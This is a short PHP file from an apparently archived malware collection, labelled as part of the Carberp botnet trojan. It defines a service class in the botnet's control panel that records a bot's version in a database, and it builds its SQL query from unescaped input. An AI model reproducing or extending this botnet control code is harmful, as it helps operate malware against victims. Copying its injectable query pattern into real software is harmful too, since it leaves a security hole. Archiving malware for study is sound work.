/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
<?php

class ServiceAccounts {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
    }
    
    function SetVersion($ver = ''){
	if(empty($ver)) return false;
	
        $this->db->query('update bf_bots set version = \''.$ver.'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
        
        return $ver;
    }
}

RegisterService("ServiceAccounts");